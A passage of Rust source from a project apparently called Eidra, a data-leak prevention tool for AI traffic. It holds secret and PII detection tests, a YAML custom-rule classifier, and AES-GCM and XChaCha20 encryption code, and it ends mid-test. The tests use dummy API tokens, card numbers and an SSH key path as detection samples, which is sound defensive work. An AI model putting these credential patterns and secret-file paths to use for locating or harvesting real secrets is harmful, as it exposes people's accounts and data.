        let findings = classify("token: glpat-ABCDEFGHIJKLMNOPQRST");
        assert!(has_rule(&findings, "gitlab_token"));
    }
    #[test]
    fn test_gitlab_token_no_match() {
        let findings = classify("token: glpat-short");
        assert!(!has_rule(&findings, "gitlab_token"));
    }

    // 5. Slack Token
    #[test]
    fn test_slack_token_match() {
        let findings = classify("slack: xoxb-123456789-abcdef");
        assert!(has_rule(&findings, "slack_token"));
    }
    #[test]
    fn test_slack_token_no_match() {
        let findings = classify("slack: xoxz-nothing");
        assert!(!has_rule(&findings, "slack_token"));
    }

    // 6. Stripe Key
    #[test]
    fn test_stripe_key_match() {
        let findings = classify("key: sk_live_ABCDEFghijklmnopqrst");
        assert!(has_rule(&findings, "stripe_key"));
    }
    #[test]
    fn test_stripe_key_no_match() {
        let findings = classify("key: sk_test_ABCDEFghijklmnopqrst");
        assert!(!has_rule(&findings, "stripe_key"));
    }

    // 7. Google API Key
    #[test]
    fn test_google_api_key_match() {
        let findings = classify(concat!("key: AIza", "SyA1234567890abcdefghijklmnopqrstuv"));
        assert!(has_rule(&findings, "google_api_key"));
    }
    #[test]
    fn test_google_api_key_no_match() {
        let findings = classify("key: notakey");
        assert!(!has_rule(&findings, "google_api_key"));
    }

    // 8. JWT
    #[test]
    fn test_jwt_match() {
        let findings =
            classify("token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature");
        assert!(has_rule(&findings, "jwt"));
    }
    #[test]
    fn test_jwt_no_match() {
        let findings = classify("token: notajwt.notajwt.sig");
        assert!(!has_rule(&findings, "jwt"));
    }

    // 9. Private Key
    #[test]
    fn test_private_key_match() {
        let findings = classify("-----BEGIN RSA PRIVATE KEY-----");
        assert!(has_rule(&findings, "private_key"));
    }
    #[test]
    fn test_private_key_no_match() {
        let findings = classify("-----BEGIN PUBLIC KEY-----");
        assert!(!has_rule(&findings, "private_key"));
    }

    // 10. Email
    #[test]
    fn test_email_match() {
        let findings = classify("contact: user@example.com");
        assert!(has_rule(&findings, "email_address"));
    }
    #[test]
    fn test_email_no_match() {
        let findings = classify("contact: not-an-email");
        assert!(!has_rule(&findings, "email_address"));
    }

    // 11. Phone
    #[test]
    fn test_phone_match() {
        let findings = classify("call: +15551234567");
        assert!(has_rule(&findings, "phone_international"));
    }
    #[test]
    fn test_phone_no_match() {
        let findings = classify("call: 555-1234");
        assert!(!has_rule(&findings, "phone_international"));
    }

    // 12. Credit Card
    #[test]
    fn test_credit_card_match() {
        let findings = classify("card: 4111111111111111");
        assert!(has_rule(&findings, "credit_card"));
    }
    #[test]
    fn test_credit_card_no_match() {
        let findings = classify("card: 1234567890123456");
        assert!(!has_rule(&findings, "credit_card"));
    }

    // 13. US SSN
    #[test]
    fn test_ssn_match() {
        let findings = classify("ssn: 123-45-6789");
        assert!(has_rule(&findings, "us_ssn"));
    }
    #[test]
    fn test_ssn_no_match() {
        let findings = classify("ssn: 123456789");
        assert!(!has_rule(&findings, "us_ssn"));
    }

    // 14. IPv4
    #[test]
    fn test_ipv4_match() {
        let findings = classify("host: 192.168.1.1");
        assert!(has_rule(&findings, "ipv4_address"));
    }
    #[test]
    fn test_ipv4_skip_localhost() {
        let findings = classify("host: 127.0.0.1");
        assert!(!has_rule(&findings, "ipv4_address"));
    }

    // 15. DB Connection String
    #[test]
    fn test_db_conn_match() {
        let findings = classify("url: postgres://user:pass@host/db");
        assert!(has_rule(&findings, "db_connection_string"));
    }
    #[test]
    fn test_db_conn_no_match() {
        let findings = classify("url: https://example.com");
        assert!(!has_rule(&findings, "db_connection_string"));
    }

    // 16. Env Secret Assignment
    #[test]
    fn test_env_secret_match() {
        let findings = classify("API_KEY=sk1234567890abcdef");
        assert!(has_rule(&findings, "env_secret_assignment"));
    }
    #[test]
    fn test_env_secret_no_match() {
        let findings = classify("NAME=John");
        assert!(!has_rule(&findings, "env_secret_assignment"));
    }

    // 17. Internal Hostname
    #[test]
    fn test_internal_hostname_match() {
        let findings = classify("host: db.internal.acme");
        assert!(has_rule(&findings, "internal_hostname"));
    }
    #[test]
    fn test_internal_hostname_no_match() {
        let findings = classify("host: example.com");
        assert!(!has_rule(&findings, "internal_hostname"));
    }

    // 18. Password Assignment
    #[test]
    fn test_password_match() {
        let findings = classify(r#"password="SuperSecret123""#);
        assert!(has_rule(&findings, "password_assignment"));
    }
    #[test]
    fn test_password_no_match() {
        let findings = classify("password policy enforced");
        assert!(!has_rule(&findings, "password_assignment"));
    }

    // 19. High Entropy Base64
    #[test]
    fn test_high_entropy_match() {
        // Random-looking base64 string
        let findings = classify("secret: K7gNU3sdo+OL0wNhqoVWhr3g6s1xYv72ol/pe/Unols=AAAA");
        assert!(has_rule(&findings, "high_entropy_base64"));
    }
    #[test]
    fn test_high_entropy_no_match() {
        // Repetitive — low entropy
        let findings = classify("data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
        assert!(!has_rule(&findings, "high_entropy_base64"));
    }

    // 20. Sensitive File Path
    #[test]
    fn test_sensitive_path_match() {
        let findings = classify("file: /home/user/.ssh/id_rsa");
        assert!(has_rule(&findings, "sensitive_file_path"));
    }
    #[test]
    fn test_sensitive_path_no_match() {
        let findings = classify("file: /home/user/documents/report.pdf");
        assert!(!has_rule(&findings, "sensitive_file_path"));
    }

    // 21. Azure Storage Key
    #[test]
    fn test_azure_storage_key_match() {
        let key = format!("AccountKey={}", "A".repeat(86) + "==");
        let findings = classify(&key);
        assert!(has_rule(&findings, "azure_storage_key"));
    }
    #[test]
    fn test_azure_storage_key_no_match() {
        let findings = classify("AccountKey=shortkey");
        assert!(!has_rule(&findings, "azure_storage_key"));
    }

    // 22. Heroku API Key
    #[test]
    fn test_heroku_api_key_match() {
        let findings = classify("HEROKU_API_KEY=12345678-1234-1234-1234-123456789abc");
        assert!(has_rule(&findings, "heroku_api_key"));
    }
    #[test]
    fn test_heroku_api_key_no_match() {
        let findings = classify("HEROKU_REGION=us");
        assert!(!has_rule(&findings, "heroku_api_key"));
    }

    // 23. Twilio Account SID
    #[test]
    fn test_twilio_sid_match() {
        let sid = format!("AC{}", "a".repeat(32));
        let findings = classify(&sid);
        assert!(has_rule(&findings, "twilio_account_sid"));
    }
    #[test]
    fn test_twilio_sid_no_match() {
        let findings = classify("ACshort");
        assert!(!has_rule(&findings, "twilio_account_sid"));
    }

    // 24. Twilio Auth Token
    #[test]
    fn test_twilio_auth_token_match() {
        let token = format!("twilio_auth_token={}", "a1b2c3d4".repeat(4));
        let findings = classify(&token);
        assert!(has_rule(&findings, "twilio_auth_token"));
    }
    #[test]
    fn test_twilio_auth_token_no_match() {
        let findings = classify("twilio_region=us1");
        assert!(!has_rule(&findings, "twilio_auth_token"));
    }

    // 25. Mailgun API Key
    #[test]
    fn test_mailgun_api_key_match() {
        let key = format!("key-{}", "a1b2c3d4e5f6g7h8".repeat(2));
        let findings = classify(&key);
        assert!(has_rule(&findings, "mailgun_api_key"));
    }
    #[test]
    fn test_mailgun_api_key_no_match() {
        let findings = classify("key-short");
        assert!(!has_rule(&findings, "mailgun_api_key"));
    }

    // 26. SendGrid API Key
    #[test]
    fn test_sendgrid_api_key_match() {
        let key = format!("SG.{}.{}", "A".repeat(22), "B".repeat(43));
        let findings = classify(&key);
        assert!(has_rule(&findings, "sendgrid_api_key"));
    }
    #[test]
    fn test_sendgrid_api_key_no_match() {
        let findings = classify("SG.short.short");
        assert!(!has_rule(&findings, "sendgrid_api_key"));
    }

    // 27. Telegram Bot Token
    #[test]
    fn test_telegram_bot_token_match() {
        let token = format!("123456789:{}", "A".repeat(35));
        let findings = classify(&token);
        assert!(has_rule(&findings, "telegram_bot_token"));
    }
    #[test]
    fn test_telegram_bot_token_no_match() {
        let findings = classify("123:short");
        assert!(!has_rule(&findings, "telegram_bot_token"));
    }

    // 28. Discord Webhook
    #[test]
    fn test_discord_webhook_match() {
        let findings = classify("https://discord.com/api/webhooks/123456789/ABCdef_token-here");
        assert!(has_rule(&findings, "discord_webhook"));
    }
    #[test]
    fn test_discord_webhook_no_match() {
        let findings = classify("https://discord.com/channels/123");
        assert!(!has_rule(&findings, "discord_webhook"));
    }

    // 29. Discord Bot Token
    #[test]
    fn test_discord_bot_token_match() {
        let token = format!("M{}.abcdef.{}", "A".repeat(23), "B".repeat(27));
        let findings = classify(&token);
        assert!(has_rule(&findings, "discord_bot_token"));
    }
    #[test]
    fn test_discord_bot_token_no_match() {
        let findings = classify("Xshort.ab.cd");
        assert!(!has_rule(&findings, "discord_bot_token"));
    }

    // 30. npm Token
    #[test]
    fn test_npm_token_match() {
        let token = format!("npm_{}", "A".repeat(36));
        let findings = classify(&token);
        assert!(has_rule(&findings, "npm_token"));
    }
    #[test]
    fn test_npm_token_no_match() {
        let findings = classify("npm_short");
        assert!(!has_rule(&findings, "npm_token"));
    }

    // 31. PyPI Token
    #[test]
    fn test_pypi_token_match() {
        let token = format!("pypi-{}", "A".repeat(150));
        let findings = classify(&token);
        assert!(has_rule(&findings, "pypi_token"));
    }
    #[test]
    fn test_pypi_token_no_match() {
        let findings = classify("pypi-short");
        assert!(!has_rule(&findings, "pypi_token"));
    }

    // 32. Docker Registry Password
    #[test]
    fn test_docker_password_match() {
        let findings = classify(r#"docker_password="mysecretpass""#);
        assert!(has_rule(&findings, "docker_registry_password"));
    }
    #[test]
    fn test_docker_password_no_match() {
        let findings = classify("docker pull nginx");
        assert!(!has_rule(&findings, "docker_registry_password"));
    }

    // 33. Generic API Key Assignment
    #[test]
    fn test_generic_api_key_match() {
        let findings = classify("api_key=ABCDEFGHIJKLMNOPQRSTUVWX");
        assert!(has_rule(&findings, "generic_api_key"));
    }
    #[test]
    fn test_generic_api_key_no_match() {
        let findings = classify("api_key=short");
        assert!(!has_rule(&findings, "generic_api_key"));
    }

    // 34. My Number (マイナンバー)
    #[test]
    fn test_my_number_match() {
        let findings = classify("マイナンバー: 1234 5678 9012");
        assert!(has_rule(&findings, "my_number"));
    }
    #[test]
    fn test_my_number_no_match() {
        // Plain 12-digit numbers without context should NOT match (false positive prevention)
        let findings = classify("order 1234 5678 9012");
        assert!(!has_rule(&findings, "my_number"));
    }

    // 35. Japanese Phone Number
    #[test]
    fn test_japanese_phone_match() {
        let findings = classify("tel: 090-1234-5678");
        assert!(has_rule(&findings, "japanese_phone"));
    }
    #[test]
    fn test_japanese_phone_no_match() {
        let findings = classify("tel: 03-1234-5678");
        assert!(!has_rule(&findings, "japanese_phone"));
    }

    // 36. Physical Address
    #[test]
    fn test_physical_address_match() {
        let findings = classify("address: 123 Main Street");
        assert!(has_rule(&findings, "physical_address"));
    }
    #[test]
    fn test_physical_address_no_match() {
        let findings = classify("address: Tokyo, Japan");
        assert!(!has_rule(&findings, "physical_address"));
    }

    // 37. Kubernetes Secret
    #[test]
    fn test_kubernetes_secret_match() {
        let findings = classify("kind: Secret");
        assert!(has_rule(&findings, "kubernetes_secret"));
    }
    #[test]
    fn test_kubernetes_secret_no_match() {
        let findings = classify("kind: ConfigMap");
        assert!(!has_rule(&findings, "kubernetes_secret"));
    }

    // 38. Terraform State Secret
    #[test]
    fn test_terraform_state_match() {
        let findings = classify(r#""type": "aws_iam_role""#);
        assert!(has_rule(&findings, "terraform_state_secret"));
    }
    #[test]
    fn test_terraform_state_no_match() {
        let findings = classify(r#""type": "google_compute""#);
        assert!(!has_rule(&findings, "terraform_state_secret"));
    }

    // 39. Authorization Bearer
    #[test]
    fn test_auth_bearer_match() {
        let findings = classify("Authorization: Bearer eyJhbGcitoken123.test=");
        assert!(has_rule(&findings, "authorization_bearer"));
    }
    #[test]
    fn test_auth_bearer_no_match() {
        let findings = classify("Authorization: Basic dXNlcjpwYXNz");
        assert!(!has_rule(&findings, "authorization_bearer"));
    }

    // 40. Redis URL
    #[test]
    fn test_redis_url_match() {
        let findings = classify("url: redis://user:pass@localhost:6379/0");
        assert!(has_rule(&findings, "redis_url"));
    }
    #[test]
    fn test_redis_url_no_match() {
        let findings = classify("url: https://redis.io");
        assert!(!has_rule(&findings, "redis_url"));
    }

    // 41. Postmark Server Token
    #[test]
    fn test_postmark_token_match() {
        let findings = classify("postmark_token=12345678-1234-1234-1234-123456789abc");
        assert!(has_rule(&findings, "postmark_server_token"));
    }
    #[test]
    fn test_postmark_token_no_match() {
        let findings = classify("postmark_region=us");
        assert!(!has_rule(&findings, "postmark_server_token"));
    }

    // 42. Databricks Token
    #[test]
    fn test_databricks_token_match() {
        let token = format!("dapi{}", "a".repeat(32));
        let findings = classify(&token);
        assert!(has_rule(&findings, "databricks_token"));
    }
    #[test]
    fn test_databricks_token_no_match() {
        let findings = classify("dapishort");
        assert!(!has_rule(&findings, "databricks_token"));
    }

    // 43. OpenAI API Key
    #[test]
    fn test_openai_api_key_match() {
        let key = format!("sk-{}T3BlbkFJ{}", "A".repeat(20), "B".repeat(20));
        let findings = classify(&key);
        assert!(has_rule(&findings, "openai_api_key"));
    }
    #[test]
    fn test_openai_api_key_no_match() {
        let findings = classify("sk-shortkey");
        assert!(!has_rule(&findings, "openai_api_key"));
    }

    // 44. Anthropic API Key
    #[test]
    fn test_anthropic_api_key_match() {
        let key = format!("sk-ant-{}", "A".repeat(80));
        let findings = classify(&key);
        assert!(has_rule(&findings, "anthropic_api_key"));
    }
    #[test]
    fn test_anthropic_api_key_no_match() {
        let findings = classify("sk-ant-short");
        assert!(!has_rule(&findings, "anthropic_api_key"));
    }

    // 45. Supabase Key
    #[test]
    fn test_supabase_key_match() {
        let findings = classify(
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSJ9.signature_here",
        );
        assert!(has_rule(&findings, "supabase_key"));
    }
    #[test]
    fn test_supabase_key_no_match() {
        let findings = classify("eyJhbGciOiJSUzI1NiJ9.payload.sig");
        assert!(!has_rule(&findings, "supabase_key"));
    }

    // 46. Firebase Config
    #[test]
    fn test_firebase_config_match() {
        let findings = classify(r#"firebase config apiKey: "AIzaSyABCDEF""#);
        assert!(has_rule(&findings, "firebase_config"));
    }
    #[test]
    fn test_firebase_config_no_match() {
        let findings = classify("firebase deploy --project myapp");
        assert!(!has_rule(&findings, "firebase_config"));
    }

    // 47. HashiCorp Vault Token
    #[test]
    fn test_vault_token_match() {
        let token = format!("hvs.{}", "A".repeat(24));
        let findings = classify(&token);
        assert!(has_rule(&findings, "hashicorp_vault_token"));
    }
    #[test]
    fn test_vault_token_no_match() {
        let findings = classify("hvs.short");
        assert!(!has_rule(&findings, "hashicorp_vault_token"));
    }
}
```

### crates/eidra-scan/src/rules/custom.rs
```rust
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::path::Path;

use crate::classifier::Classifier;
use crate::findings::{Category, Finding, Severity};

/// A custom rule defined in YAML.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CustomRuleDefinition {
    pub name: String,
    pub pattern: String,
    #[serde(default = "default_category")]
    pub category: String,
    #[serde(default = "default_severity")]
    pub severity: String,
    #[serde(default)]
    pub description: String,
}

fn default_category() -> String {
    "custom".to_string()
}

fn default_severity() -> String {
    "medium".to_string()
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CustomRulesConfig {
    #[serde(default)]
    pub rules: Vec<CustomRuleDefinition>,
}

/// A classifier that uses custom YAML-defined rules.
pub struct CustomClassifier {
    rules: Vec<CompiledCustomRule>,
}

struct CompiledCustomRule {
    name: String,
    pattern: Regex,
    category: Category,
    severity: Severity,
    description: String,
}

impl CustomClassifier {
    pub fn from_yaml(yaml: &str) -> Result<Self, String> {
        let config: CustomRulesConfig =
            serde_yaml::from_str(yaml).map_err(|e| format!("YAML parse error: {}", e))?;
        Self::from_config(config)
    }

    pub fn from_file(path: &Path) -> Result<Self, String> {
        let content =
            std::fs::read_to_string(path).map_err(|e| format!("File read error: {}", e))?;
        Self::from_yaml(&content)
    }

    fn from_config(config: CustomRulesConfig) -> Result<Self, String> {
        let mut rules = Vec::new();
        for def in config.rules {
            let pattern = Regex::new(&def.pattern)
                .map_err(|e| format!("Invalid regex in rule '{}': {}", def.name, e))?;
            let category = parse_category(&def.category);
            let severity = parse_severity(&def.severity);
            rules.push(CompiledCustomRule {
                name: def.name,
                pattern,
                category,
                severity,
                description: def.description,
            });
        }
        Ok(Self { rules })
    }

    pub fn rule_count(&self) -> usize {
        self.rules.len()
    }
}

impl Classifier for CustomClassifier {
    fn classify(&self, input: &str) -> Vec<Finding> {
        let mut findings = Vec::new();
        for rule in &self.rules {
            for mat in rule.pattern.find_iter(input) {
                findings.push(Finding::new(
                    rule.category.clone(),
                    rule.severity.clone(),
                    &rule.name,
                    &rule.description,
                    mat.as_str(),
                    mat.start(),
                    mat.len(),
                ));
            }
        }
        findings
    }

    fn name(&self) -> &str {
        "custom_classifier"
    }
}

fn parse_category(s: &str) -> Category {
    match s.to_lowercase().as_str() {
        "api_key" => Category::ApiKey,
        "secret_key" => Category::SecretKey,
        "private_key" => Category::PrivateKey,
        "token" => Category::Token,
        "credential" => Category::Credential,
        "pii" => Category::Pii,
        "internal_infra" => Category::InternalInfra,
        "sensitive_path" => Category::SensitivePath,
        "high_entropy" => Category::HighEntropy,
        other => Category::Custom(other.to_string()),
    }
}

fn parse_severity(s: &str) -> Severity {
    match s.to_lowercase().as_str() {
        "critical" => Severity::Critical,
        "high" => Severity::High,
        "medium" => Severity::Medium,
        "low" => Severity::Low,
        "info" => Severity::Info,
        other => Severity::Custom(other.to_string()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_custom_rule_from_yaml() {
        let yaml = r#"
rules:
  - name: internal_project_id
    pattern: "PROJ-[0-9]{6}"
    category: internal_infra
    severity: medium
    description: "Internal project identifier"
  - name: company_email
    pattern: "[a-z]+@mycompany\\.com"
    category: pii
    severity: low
    description: "Company email address"
"#;
        let classifier = CustomClassifier::from_yaml(yaml).unwrap();
        assert_eq!(classifier.rule_count(), 2);

        let findings = classifier.classify("ticket PROJ-123456 by alice@mycompany.com");
        assert_eq!(findings.len(), 2);
        assert!(findings
            .iter()
            .any(|f| f.rule_name == "internal_project_id"));
        assert!(findings.iter().any(|f| f.rule_name == "company_email"));
    }

    #[test]
    fn test_custom_rule_no_match() {
        let yaml = r#"
rules:
  - name: test_rule
    pattern: "SECRET_[A-Z]{10}"
    category: secret_key
    severity: high
    description: "Test secret"
"#;
        let classifier = CustomClassifier::from_yaml(yaml).unwrap();
        let findings = classifier.classify("nothing sensitive here");
        assert!(findings.is_empty());
    }

    #[test]
    fn test_invalid_regex() {
        let yaml = r#"
rules:
  - name: bad_rule
    pattern: "[invalid"
    category: custom
    severity: medium
    description: "Bad regex"
"#;
        let result = CustomClassifier::from_yaml(yaml);
        assert!(result.is_err());
    }
}
```

### crates/eidra-scan/src/rules/mod.rs
```rust
pub mod builtin;
pub mod custom;
```

### crates/eidra-scan/src/scanner.rs
```rust
use crate::classifier::Classifier;
use crate::findings::Finding;
use crate::rules::builtin::TextClassifier;

pub struct Scanner {
    classifiers: Vec<Box<dyn Classifier>>,
}

impl Scanner {
    pub fn new() -> Self {
        Self {
            classifiers: Vec::new(),
        }
    }

    pub fn with_defaults() -> Self {
        let mut scanner = Self::new();
        scanner.add_classifier(Box::new(TextClassifier::new()));
        scanner
    }

    pub fn add_classifier(&mut self, classifier: Box<dyn Classifier>) {
        self.classifiers.push(classifier);
    }

    pub fn classifier_count(&self) -> usize {
        self.classifiers.len()
    }

    pub fn scan(&self, input: &str) -> Vec<Finding> {
        self.classifiers
            .iter()
            .flat_map(|c| c.classify(input))
            .collect()
    }
}

impl Default for Scanner {
    fn default() -> Self {
        Self::with_defaults()
    }
}
```

### crates/eidra-seal/src/entry.rs
```rust
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};

/// The type of session that generated this metadata entry.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum SessionType {
    /// An AI model request (e.g., to Claude, GPT).
    AiRequest,
    /// An E2EE secure channel session.
    SecureChannel,
    /// A device/agent identity verification.
    IdentityVerification,
    /// An agent-to-agent message.
    AgentMessage,
    /// A payment authorization (future).
    PaymentAuthorization,
    /// Custom session type.
    Custom(String),
}

/// A sealed metadata entry as defined in CLAUDE.md Section 2.6.
///
/// Contains ONLY metadata about a session — never the content itself.
/// In v1, encrypted with a single local AES-256-GCM key.
/// In v2, the key will be split via Shamir's Secret Sharing.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SealedMetadataEntry {
    /// When this event occurred.
    pub timestamp: DateTime<Utc>,
    /// The type of session.
    pub session_type: SessionType,
    /// SHA-256 hash of the source device's public key.
    pub source_device_hash: String,
    /// Destination identifier (API endpoint or peer device hash).
    pub destination_hash: String,
    /// Action taken: allow, mask, block, escalate.
    pub action: String,
    /// Number of findings from the scan engine.
    pub findings_count: u32,
    /// Categories of findings (e.g., "api_key", "pii") — NOT the actual values.
    pub findings_categories: Vec<String>,
    /// Size of the data in bytes.
    pub data_size_bytes: u64,
    /// The policy rule that triggered this action.
    pub policy_rule: String,
    /// Eidra version that produced this entry.
    pub eidra_version: String,
}

impl SealedMetadataEntry {
    /// Create a new metadata entry with the current timestamp.
    pub fn new(
        session_type: SessionType,
        source_device_hash: impl Into<String>,
        destination_hash: impl Into<String>,
        action: impl Into<String>,
    ) -> Self {
        Self {
            timestamp: Utc::now(),
            session_type,
            source_device_hash: source_device_hash.into(),
            destination_hash: destination_hash.into(),
            action: action.into(),
            findings_count: 0,
            findings_categories: Vec::new(),
            data_size_bytes: 0,
            policy_rule: String::new(),
            eidra_version: env!("CARGO_PKG_VERSION").to_string(),
        }
    }
}
```

### crates/eidra-seal/src/error.rs
```rust
use thiserror::Error;

/// Errors that can occur in the sealed metadata layer.
#[derive(Debug, Error)]
pub enum SealError {
    /// Encryption failed.
    #[error("encryption error: {0}")]
    Encryption(String),

    /// Decryption failed.
    #[error("decryption error: {0}")]
    Decryption(String),

    /// I/O error.
    #[error("io error: {0}")]
    Io(String),

    /// Serialization/deserialization error.
    #[error("serialization error: {0}")]
    Serialization(String),

    /// Custom error.
    #[error("{0}")]
    Custom(String),
}

pub type Result<T> = std::result::Result<T, SealError>;
```

### crates/eidra-seal/src/lib.rs
```rust
pub mod entry;
pub mod error;
pub mod seal;
```

### crates/eidra-seal/src/seal.rs
```rust
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use rand::RngCore;

use crate::entry::SealedMetadataEntry;
use crate::error::{Result, SealError};

/// Nonce size for AES-256-GCM (12 bytes).
const NONCE_SIZE: usize = 12;

/// Generate a random 256-bit key for sealing metadata.
///
/// In v1, this is a single key stored locally.
/// In v2, this key will be split via Shamir's Secret Sharing (2-of-2).
pub fn generate_seal_key() -> [u8; 32] {
    let mut key = [0u8; 32];
    rand::thread_rng().fill_bytes(&mut key);
    key
}

/// Encrypt a metadata entry with AES-256-GCM.
///
/// Returns nonce (12 bytes) || ciphertext.
pub fn seal_entry(key: &[u8; 32], entry: &SealedMetadataEntry) -> Result<Vec<u8>> {
    let plaintext = serde_json::to_vec(entry)
        .map_err(|e| SealError::Serialization(format!("failed to serialize entry: {e}")))?;

    let cipher = Aes256Gcm::new_from_slice(key)
        .map_err(|e| SealError::Encryption(format!("failed to create cipher: {e}")))?;

    let mut nonce_bytes = [0u8; NONCE_SIZE];
    rand::thread_rng().fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);

    let ciphertext = cipher
        .encrypt(nonce, plaintext.as_slice())
        .map_err(|e| SealError::Encryption(format!("encryption failed: {e}")))?;

    let mut output = Vec::with_capacity(NONCE_SIZE + ciphertext.len());
    output.extend_from_slice(&nonce_bytes);
    output.extend_from_slice(&ciphertext);
    Ok(output)
}

/// Decrypt a sealed metadata entry with AES-256-GCM.
pub fn unseal_entry(key: &[u8; 32], sealed_data: &[u8]) -> Result<SealedMetadataEntry> {
    if sealed_data.len() < NONCE_SIZE {
        return Err(SealError::Decryption(
            "sealed data too short (missing nonce)".into(),
        ));
    }

    let (nonce_bytes, ciphertext) = sealed_data.split_at(NONCE_SIZE);
    let nonce = Nonce::from_slice(nonce_bytes);

    let cipher = Aes256Gcm::new_from_slice(key)
        .map_err(|e| SealError::Decryption(format!("failed to create cipher: {e}")))?;

    let plaintext = cipher
        .decrypt(nonce, ciphertext)
        .map_err(|e| SealError::Decryption(format!("decryption failed: {e}")))?;

    serde_json::from_slice(&plaintext)
        .map_err(|e| SealError::Serialization(format!("failed to deserialize entry: {e}")))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::entry::{SealedMetadataEntry, SessionType};

    fn sample_entry() -> SealedMetadataEntry {
        let mut entry = SealedMetadataEntry::new(
            SessionType::AiRequest,
            "a3f2deadbeef",
            "api.anthropic.com",
            "mask",
        );
        entry.findings_count = 2;
        entry.findings_categories = vec!["api_key".into(), "pii".into()];
        entry.data_size_bytes = 8192;
        entry.policy_rule = "default:high-severity".into();
        entry
    }

    #[test]
    fn seal_unseal_roundtrip() {
        let key = generate_seal_key();
        let entry = sample_entry();

        let sealed = seal_entry(&key, &entry).expect("sealing should succeed");
        assert!(sealed.len() > NONCE_SIZE);

        let unsealed = unseal_entry(&key, &sealed).expect("unsealing should succeed");
        assert_eq!(unsealed.action, "mask");
        assert_eq!(unsealed.findings_count, 2);
        assert_eq!(unsealed.findings_categories, vec!["api_key", "pii"]);
        assert_eq!(unsealed.data_size_bytes, 8192);
        assert_eq!(unsealed.source_device_hash, "a3f2deadbeef");
        assert_eq!(unsealed.destination_hash, "api.anthropic.com");
        assert_eq!(unsealed.policy_rule, "default:high-severity");
    }

    #[test]
    fn unseal_with_wrong_key_fails() {
        let key = generate_seal_key();
        let wrong_key = generate_seal_key();
        let entry = sample_entry();

        let sealed = seal_entry(&key, &entry).expect("sealing should succeed");
        let result = unseal_entry(&wrong_key, &sealed);
        assert!(result.is_err());
    }

    #[test]
    fn unseal_too_short_data_fails() {
        let key = generate_seal_key();
        let result = unseal_entry(&key, &[1, 2, 3]);
        assert!(result.is_err());
    }

    #[test]
    fn all_session_types_serialize() {
        let key = generate_seal_key();

        for session_type in [
            SessionType::AiRequest,
            SessionType::SecureChannel,
            SessionType::IdentityVerification,
            SessionType::AgentMessage,
            SessionType::PaymentAuthorization,
            SessionType::Custom("test".into()),
        ] {
            let entry = SealedMetadataEntry::new(session_type, "src", "dst", "allow");
            let sealed = seal_entry(&key, &entry).expect("sealing should succeed");
            let unsealed = unseal_entry(&key, &sealed).expect("unsealing should succeed");
            assert_eq!(unsealed.action, "allow");
        }
    }
}
```

### crates/eidra-transport/src/crypto.rs
```rust
use chacha20poly1305::{
    aead::{Aead, KeyInit},
    XChaCha20Poly1305, XNonce,
};
use rand::RngCore;
use x25519_dalek::{PublicKey, SharedSecret, StaticSecret};

use crate::error::{Result, TransportError};

/// Nonce size for XChaCha20-Poly1305 (24 bytes).
const NONCE_SIZE: usize = 24;

/// An X25519 key pair for E2EE key exchange.
pub struct KeyPair {
    /// The public key (safe to share).
    pub public_key: PublicKey,
    /// The secret key (never leaves the device).
    secret_key: StaticSecret,
}

impl KeyPair {
    /// Access the secret key (for key exchange).
    pub fn secret_key(&self) -> &StaticSecret {
        &self.secret_key
    }
}

// No manual Drop needed: StaticSecret is automatically zeroized on drop
// by x25519-dalek when the "zeroize" feature is enabled (which it is).

/// Generate a new X25519 key pair.
pub fn generate_keypair() -> KeyPair {
    let mut rng = rand::thread_rng();
    let secret_key = StaticSecret::random_from_rng(&mut rng);
    let public_key = PublicKey::from(&secret_key);
    KeyPair {
        public_key,
        secret_key,
    }
}

/// Derive a shared secret from our secret key and their public key (X25519 DH).
pub fn derive_shared_secret(our_secret: &StaticSecret, their_public: &PublicKey) -> SharedSecret {
    our_secret.diffie_hellman(their_public)
}

/// Encrypt plaintext using XChaCha20-Poly1305 with a 256-bit key.
///
/// Returns nonce (24 bytes) || ciphertext.
pub fn encrypt(key: &[u8; 32], plaintext: &[u8]) -> Result<Vec<u8>> {
    let cipher = XChaCha20Poly1305::new_from_slice(key)
        .map_err(|e| TransportError::Crypto(format!("failed to create cipher: {e}")))?;

    let mut nonce_bytes = [0u8; NONCE_SIZE];
    rand::thread_rng().fill_bytes(&mut nonce_bytes);
    let nonce = XNonce::from_slice(&nonce_bytes);

    let ciphertext = cipher
        .encrypt(nonce, plaintext)
        .map_err(|e| TransportError::Crypto(format!("encryption failed: {e}")))?;

    // Prepend nonce to ciphertext
    let mut output = Vec::with_capacity(NONCE_SIZE + ciphertext.len());
    output.extend_from_slice(&nonce_bytes);
    output.extend_from_slice(&ciphertext);
    Ok(output)
}

/// Decrypt ciphertext (nonce || ciphertext) using XChaCha20-Poly1305 with a 256-bit key.
pub fn decrypt(key: &[u8; 32], data: &[u8]) -> Result<Vec<u8>> {
    if data.len() < NONCE_SIZE {
        return Err(TransportError::Crypto(
            "ciphertext too short (missing nonce)".into(),
        ));
    }

    let (nonce_bytes, ciphertext) = data.split_at(NONCE_SIZE);
    let nonce = XNonce::from_slice(nonce_bytes);

    let cipher = XChaCha20Poly1305::new_from_slice(key)
        .map_err(|e| TransportError::Crypto(format!("failed to create cipher: {e}")))?;

    cipher
        .decrypt(nonce, ciphertext)
        .map_err(|e| TransportError::Crypto(format!("decryption failed: {e}")))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn encrypt_decrypt_roundtrip() {
        let key = [42u8; 32];
        let plaintext = b"Hello, Eidra! This is a secret message.";

        let encrypted = encrypt(&key, plaintext).expect("encryption should succeed");
        assert_ne!(&encrypted[NONCE_SIZE..], plaintext);

        let decrypted = decrypt(&key, &encrypted).expect("decryption should succeed");
        assert_eq!(decrypted, plaintext);
